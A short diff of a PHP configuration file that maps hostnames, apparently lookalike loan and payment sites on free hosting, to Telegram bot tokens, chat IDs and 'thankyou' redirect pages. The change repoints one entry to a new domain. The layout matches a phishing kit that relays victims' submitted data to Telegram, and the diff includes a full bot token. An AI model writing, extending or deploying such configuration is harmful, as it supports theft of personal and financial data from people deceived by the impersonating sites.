@@ -13,12 +13,13 @@ $site_map = [
         "redirect" => "https://upstartloan.rf.gd/cache_site/thankyou.html"
     ],
 
-    'upstarts.onrender.com' => [
+
+    'paysphere-hcr2.onrender.com' => [
         'bots' => [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
             ['token' => '', 'chat_id' => '']
         ],
-        'redirect' => 'https://upstarts.onrender.com/cache_site/thankyou.html'
+        'redirect' => 'https://paysphere-hcr2.onrender.com/cache_site/thankyou.html'
     ],
     
 
